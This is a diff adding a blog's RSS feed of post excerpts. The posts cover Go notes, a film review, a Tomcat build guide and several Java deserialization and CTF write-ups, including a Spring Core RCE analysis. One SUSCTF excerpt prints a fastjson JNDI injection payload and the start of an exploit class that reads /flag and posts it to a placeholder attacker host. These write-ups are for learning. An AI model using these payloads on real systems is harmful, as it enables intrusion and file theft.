@@ -1,0 +1,155 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Hello World</title>
+    <link>https://bikeknight.top/posts/</link>
+    <description>Recent content in Posts on Hello World</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 18 Apr 2022 00:48:19 +0800</lastBuildDate><atom:link href="https://bikeknight.top/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>《GoInAction》阅读小记</title>
+      <link>https://bikeknight.top/posts/goinaction/</link>
+      <pubDate>Mon, 18 Apr 2022 00:48:19 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/goinaction/</guid>
+      <description>第二章 快速开始一个Go程序 第三章 打包和工具链 第四章 数组、切片和映射   在函数间传递是「值传递」，当数组很大的时候这是一个开销很大的操作，这时候可以通过传递数组指针来代替。
+func foo(array *[1e6]int) {}   切片是对数组的一段引用，有三部分构成：指向数组的指针、长度和容量，所以在函数间传递切片只需要24字节的内存（64位机器上），传递的也是数组的一个副本，因为只有24字节，所以这是一个轻量、快速的过程，这也是切片效率高的地方。
+Slice = | ptr -&amp;gt; array | len | cap |   在函数间传递map的时候并不会传递副本，这一点和切片类似。
+  将切片或map传递给函数的成本很小，并且不会复制底层的数据结构。
+  第五章 Go语言的类型系统   方法有两种接收者：值接收者和指针接收者。
+  使用值接收者的方法，调用时会使用这个值的一个副本来执行。
+  可以通过指针来调用值接收者的方法，Go会自动解引用，不过方法操作仍是一个副本（指针指向的值的副本）。
+  指针接收者使用实际值来调用方法。
+  可以通过值（❗️前提是这个值是addressable可寻址的）来调用指针接收者的方法，Go会自动取地址（但是并不推荐这样做，因为编译器不能总是获取一个值的地址）。
+  定义方法时使用的接收者的类型决定了方法是关联到值还是关联到指针，或者两个都关联。
+(t T) -&amp;gt; T and *T (t *T) -&amp;gt; *T 使用值接收者的方法会关联到类型的值和指针；使用指针接收者的方法只会关联到类型的指针。反过来说，一个值类型的变量的方法集只有值接收者的方法；一个指针类型的变量的方法集包括值接收者的方法和指针接收者的方法。
+如果使用指针接收者来实现一个接口，那么只有指向该类型的指针才能实现对应的接口。如果使用值接收者来实现一个接口，那么该类型的值和指向该类型的指针都实现了对应的接口。
+T -&amp;gt; (t T) *T -&amp;gt; (t T) and (t *T) 举例说明：</description>
+    </item>
+    
+    <item>
+      <title>Spring Core RCE</title>
+      <link>https://bikeknight.top/posts/spring-core-rce/</link>
+      <pubDate>Fri, 01 Apr 2022 23:30:57 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/spring-core-rce/</guid>
+      <description>Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修复的更新，这个漏洞的分析终于可以发出来了。
+这篇文章并不想做机械的调试分析，所以不会深入每一个细节，但是会将历史上一些相似的漏洞拿出来作为拼图，最后拼出一个完整的POC。
+这个 0day 本质上是对 CVE-2010-1622 的绕过，结合了 Structs S2-020 的利用方式，完成对 Tomcat 控制 Access 日志的 AccessLogValve 类的变量覆盖，控制日志文件的文件名、后缀、路径和内容，达到向 web 目录写 shell 的目的。
+JavaBean 的一般规范就是成员变量用 private 修饰，然后选择性的设置相应的 setter/getter 方法。除了比较熟悉的 Commons-BeanUtils 之外， Spring 中也封装了一套操作 Bean 的类，主要实现在 org.springframework.beans.BeanWrapperImpl 中，它是根据 Bean 中的 setter/getter 方法判断是否存在对应的属性，这就会导致一个问题：如果 Bean 中存在一个 getFoo()/setFoo(Foo foo) 方法，但是却没有对应的属性 foo ，Spring 还是会认为 Bean 存在一个 foo 属性，并通过 getFoo() 方法获取它的值。看下面这个例子：
+@Test public void BeanWrapperTest() {  BeanWrapperImpl beanWrapper = new BeanWrapperImpl(new User());  Arrays.stream(beanWrapper.getPropertyDescriptors()).forEach(System.out::println); }  // ############  org.</description>
+    </item>
+    
+    <item>
+      <title>Hessian二次反序列化与JDK自带HTTP库的内存马</title>
+      <link>https://bikeknight.top/posts/hessianmemshell/</link>
+      <pubDate>Mon, 21 Mar 2022 16:32:04 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/hessianmemshell/</guid>
+      <description>HFCTF2022 ezchain 二次反序列化 这道题反序列化使用的是 Hessian ，依赖给的是 ROME ，这两个组合最常见的利用方式就是以 JDBCRowSetImpl 为 sink 的JNDI注入，但是这道题目不出网，最开始想到的解决方法是用 TemplatesImpl 为sink，但是很快发现是不可用的，具体原因为：TemplatesImpl 的 _tfactory 字段为 transient 修饰 ，在序列化的过程中会被忽略，和Java原生反序列化不同的是，Hessian 反序列化的时候并不会将这个字段还原，在 defineTransletClasses() 方法中无法将 _bytecodes 中所携带的恶意类的字节码加载到JVM中，最后无法完成实例化。
+但是 Hessian 和 ROME 还是可以完成 getter 方法调用的，现在问题就变成了「可以调用一个类的 getter 方法，如何完成反序列化 RCE？」，在比赛期间是思路是使用 BCEL ClassLoader 或者二次反序列化来做，但是并没有找到合适的 getter 方法，现在想来是比较遗憾的。
+题目的正确做法是使用 java.security.SignedObject 来构造二次反序列化，它可以包装一个序列化对象，对其进行加密签名，反序列化的时候可以验证其是否被修改。它的 getObject() 方法：
+public Object getObject() throws IOException, ClassNotFoundException {  // creating a stream pipe-line, from b to a  ByteArrayInputStream b = new ByteArrayInputStream(this.content);  ObjectInput a = new ObjectInputStream(b);  Object obj = a.</description>
+    </item>
+    
+    <item>
+      <title>《新蝙蝠侠》-哥谭的黑夜</title>
+      <link>https://bikeknight.top/posts/thebatman/</link>
+      <pubDate>Mon, 21 Mar 2022 01:24:33 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/thebatman/</guid>
+      <description>作为蝙蝠侠系列的新重启之作，罗伯特·帕丁森向我们展示了一个极度愤怒、阴郁的蝙蝠侠形象。影片前期，他完全笼罩在复仇的阴影中，自称“复仇者（the Avengers）”，这个时候，他是极度矛盾和复杂的，一方面，他化身为哥谭的黑夜打击罪恶以填满自己愤怒的内心；另一方面，又会惑于自己的行为是否可以为哥谭带来真正的改变。在和谜语人交手的过程中，猫女的出现让韦恩的黑暗的内心燃起了火光，在这座冰冷阴暗的城市，两个可以真正互相理解的人在一起抱团取暖，是韦恩内心产生变化的重要原因。
+虽然都是黑暗风格的影片，《新蝙》和诺导的《三部曲》在观感上是很不同的，《新蝙》中的韦恩更加偏向于“普通人”这一身份，影片没有展示韦恩的智囊团，没有炫酷的蝙蝠黑科技，让我看到了蝙蝠侠真正平凡的一面。影片全场3小时，叙事节奏偏缓，虽然用了大量的篇幅来刻画韦恩的内心世界，但是这些情节并不无聊，从这些段落中能看出韦恩心中的挣扎，看出蝙蝠侠作为“人”的痛苦。当然，有些片段还是给我的视听感受带来的极大的震撼，比较喜欢的两场戏就是追车和在纯黑的背景下以枪的火花作为灯光的那一段动作戏，另外，有些画面是拍的十分唯美的，印象最深的就是在橙黄色画幅下和猫女在天台的镜头了：
+个人还是非常喜欢这部片子的，抛开超英的框架，《新蝙》更像是一部侦探片，给我们带来了一个不同的蝙蝠侠形象。片子的配乐也很顶级，个人感觉和《沙丘》是同水平的：
+https://music.apple.com/cn/album/the-batman/1612891580?i=1612897598
+他是哥谭的黑夜行者，是为哥谭守护光明的黑暗骑士，总之还是很期待第二部的。</description>
+    </item>
+    
+    <item>
+      <title>使用IDEA编译Tomcat的源码</title>
+      <link>https://bikeknight.top/posts/buildtomcatsourcewithidea/</link>
+      <pubDate>Thu, 17 Mar 2022 23:54:47 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/buildtomcatsourcewithidea/</guid>
+      <description>以Tomcat8.5.77为例，在GitHub或者官网下载Tomcat的源码，解压之后，使用IDEA打开。
+首先要为项目选择SDK，右键IDEA窗口右上角的小齿轮，选择Project Structure，设置JDK版本：
+由于tomcat是ant项目，首先右键点击目录中的build.xml ，然后选择Add as Ant Build File：
+添加之后，右侧应该会出现一个 Ant 的菜单，选择菜单中的 ide-intellj 右键运行，进行依赖的下载和项目的编译：
+依赖会下载到用户目录下的tomcat-build-libs文件夹下，把该文件夹下的所有文件添加到项目的lib里，除此之外，我们还需要手动下载一个ant的jar包 ，然后同样添加到项目的lib里：
+如果上个阶段编译正常，在目录中就会出现一个output文件夹，可以理解为是tomcat的工作目录。
+在Project Structure中把这个 output文件夹设置为项目的输出目录（这里直接复制绝对路径就行）：
+然后右键项目中的java目录，设置为项目的源码目录：
+添加一个 Application 的运行，主类为 org.apache.catalina.startup.Bootstrap：
+运行的 VM 参数为：
+-Dfile.encoding=UTF8 -Dcatalina.home=&amp;#34;{Tomcat源码路径}/output/build&amp;#34; -Duser.language=en -Duser.region=US 然后点击右上角的运行，如果一切正常，Tomcat就会成功启动，浏览器输入 localhost:8080 就能看到默认页面了。
+如果想要部署自己的 jsp 页面或者web项目，要在output/build/webapps 目录下进行部署，在源码根目录的 webapps 文件夹里部署是不会生效的。</description>
+    </item>
+    
+    <item>
+      <title>使用二次反序列化构造完全不含数组的Gadget</title>
+      <link>https://bikeknight.top/posts/%E4%BD%BF%E7%94%A8%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0%E5%AE%8C%E5%85%A8%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84gadget/</link>
+      <pubDate>Mon, 14 Mar 2022 08:27:22 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/%E4%BD%BF%E7%94%A8%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0%E5%AE%8C%E5%85%A8%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84gadget/</guid>
+      <description>昨天碰到了这样一个题，有一个反序列化的接口，但是使用了自定义的MyObjectInputStream进行反序列化：
+public class MyObjectInputStream extends ObjectInputStream {  private ClassLoader classLoader;   public MyObjectInputStream(InputStream inputStream) throws Exception {  super(inputStream);  URL[] urls = ((URLClassLoader) Transformer.class.getClassLoader()).getURLs();  this.classLoader = new URLClassLoader(urls);  }   protected Class&amp;lt;?&amp;gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {  Class clazz = this.classLoader.loadClass(desc.getName());  return clazz;  } } 它重写了父类的resolveClass方法，使用loadClass()方法根据类名获取相应的Class对象，而父类默认使用Class.forName()进行这一过程，这两者最大的区别就是loadClass()方法没法加载任何数组类型的对象：
+Class.forName(&amp;#34;[[B&amp;#34;);	// class [[B ClassLoader.getSystemClassLoader().loadClass(&amp;#34;[[B&amp;#34;);	// ClassNotFoundException 这道题其实就是shiro-550的pro版本，在shiro环境下也有数组的限制，不过区别在于：
+ shiro环境下只能加载Java原生类的数组对象 这道题不能加载任何数组对象  关于第一点的具体原因，可以参考P牛的小密圈，这里不再赘述。这道题的依赖是CC3.2.1，CC链的触发方法有两个：
+ Transformer数组的链式调用 TeamplatesImpl动态加载字节码  第一个不必多说，第二个加载的_bytecodes字段是byte[][]类型的，也会涉及到数组类型对象的加载，所以这道题使用原生CC链是无法解出的。</description>
+    </item>
+    
+    <item>
+      <title>Java反序列化-ROME链的长度缩减</title>
+      <link>https://bikeknight.top/posts/shortenromelength/</link>
+      <pubDate>Fri, 11 Mar 2022 11:05:16 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/shortenromelength/</guid>
+      <description>原ROME 在上周末的一场 CTF 中，有一道 Java 反序列化题目，环境的依赖是 Rome ，并且给了反序列化的接口，但是对 Base64 编码之后的序列化数据长度限制在 1956 的范围内。
+原 ROME 链这里不再分析，由于最后的触发点是我们的老朋友 TemplatesImpl ，所以最初的优化思路是参考 4rain 师傅的这篇文章对字节码进行优化，但是最后结果却不尽如人意，经过分析之后发现问题出在 ObjectBean 身上：
+public ObjectBean(Class beanClass, Object obj, Set ignoreProperties) {  this._equalsBean = new EqualsBean(beanClass, obj);  this._toStringBean = new ToStringBean(beanClass, obj);  this._cloneableBean = new CloneableBean(obj, ignoreProperties); } 构造一个 ObjectBean ，实际上在其内部还会实例化三个对象，这是原链 payload 过长的根本原因。
+修改Sink的尝试 遗憾的是，在比赛的过程中我并没有意识到 ROME 链过长的根本原因是 ObjectBean 的问题，当时做的第一个尝试是修改原链的 sink 点，由于依靠的是触发类的 getter 方法，第一时间想到的是依靠 JdbcRowSetImpl#getDatabaseMetaData 完成 JNDI 注入：
+JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.</description>
+    </item>
+    
+    <item>
+      <title>中缀表达式求值</title>
+      <link>https://bikeknight.top/posts/evaluatepostfix/</link>
+      <pubDate>Thu, 10 Mar 2022 14:34:30 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/evaluatepostfix/</guid>
+      <description>说明 对于 1+2*3-4 这类中缀表达式（infix）的求值，要考虑优先级的问题，通用解决办法是将其转换为后缀表达式（postfix），它借助栈进行运算，对机器友好，实现也比较容易。 基本的运算单元有：
+[0-9] | . | ( | ) | + | - | * | / 优先级为：( = ) &amp;gt; * = / &amp;gt; + = -
+中缀转后缀 后缀表达式用一个 List 表示，借助一个栈 opStack 来存放运算符，起到定义优先级的作用，转换的基本规则是，遍历中缀表达式：
+ 遇到数字和小数点，将其添加到一个临时变量 item 中，向后遍历，直到遇到运算符或者左括号到时候，将 item 添加到 List 中。 遇到运算符，如果栈为空，直接将其添加到栈中，如果不为空，则比较当前运算符和栈顶运算符的优先级，如果栈顶元素的优先级大于或者等于当前运算符，则将栈顶元素出栈，添加到 List 中，不断重复此动作直到栈顶元素优先级小于当前运算符（左括号除外），再将当前运算符入栈。 遇到左括号，入栈。 遇到右括号，依次弹出栈内的元素，并添加到 List 中，直到遇到左括号为止，左括号只出栈，不加入到 List 中。 遍历结束后，如果 opStack 不为空，依此弹出栈内元素，加入到 List 中。  以 a+b*c+(d*e+f)*g 为例， List 和 opStack 的变化如下：
+List opStack ----&amp;gt;Top a + ab +* abc*+ + abc*+ +( abc*+d +(* abc*+de* +(+ abc*+de*f +(+ abc*+de*f+ + abc*+de*f+ +* abc*+de*f+g +* abc*+de*f+g*+ 代码实现如下：</description>
+    </item>
+    
+    <item>
+      <title>CS143-Compiler</title>
+      <link>https://bikeknight.top/posts/cs143-compiler/</link>
+      <pubDate>Thu, 03 Mar 2022 00:11:58 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/cs143-compiler/</guid>
+      <description> Stay foolish, stay hungry.
+ CS143是斯坦福开源的编译器课程，口碑非常好，课程目前可以在哔哩哔哩看，配套有相应的assignments（有C++和Java两个版本），对我这种不会C++的人十分友好，其目标是实现一个简单的面向对象的语言 COOL，个人觉得还是值得一学的。
+笔记暂且不会放在博客上，因为迁移十分麻烦，wolai导出的md需要review才能保证不会出现格式错误，遂以链接的形式分享：
+ https://www.wolai.com/f4de/py6GpmtYvNYYx8LkBa1qKF  在学完这门课程之前，笔记会不断更新，此外，在作业完成之后会更新到Github，欢迎测试和提出issue：
+ https://github.com/F4ded/CS143-Compiler  </description>
+    </item>
+    
+    <item>
+      <title>susctf四道Java题解</title>
+      <link>https://bikeknight.top/posts/susctf-java-solution/</link>
+      <pubDate>Sun, 27 Feb 2022 21:02:11 +0800</pubDate>
+      
+      <guid>https://bikeknight.top/posts/susctf-java-solution/</guid>
+      <description>baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然后可以下载得到依赖 lib：
+ commons-lang.jar fastjson-1.2.48.jar flex-messaging-core.jar quartz.jar  在 /admin/maibox.jsp 下有一个输入框，猜测是用来解析json数据的，但是怎么打DNSLOG都没有反应，接着陷入了一天在给的lib里找gadget的过程，毫无收获。
+第二天经过队友@Siebene的提醒，发现下面这条payload，服务器监听的nc可以收到请求数据：
+{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.xbean.propertyeditor.JndiConverter&amp;#34;,&amp;#34;AsText&amp;#34;:&amp;#34;ldap://IP:PORT/Exploit&amp;#34;} JNDI注入，远程可以收到ldap和http请求，但是恶意字节码中的命令无法被执行，这时候转变了一下思路，尝试向远程发起HTTP请求，把要读取的文件带到body中，恶意字节码如下：
+import java.io.FileInputStream; import java.io.OutputStream; import java.net.HttpURLConnection; import java.net.URL; import java.io.OutputStreamWriter;   public class Exploit {  public Exploit() {  }   static {  try {  byte[] bytes = new byte[2048];  FileInputStream fis = new FileInputStream(&amp;#34;/flag&amp;#34;);  fis.read(bytes);   URL url = new URL(&amp;#34;http://IP:6666/Foo&amp;#34;);  HttpURLConnection connection = (HttpURLConnection) url.</description>
+    </item>
+    
+  </channel>
+</rss>
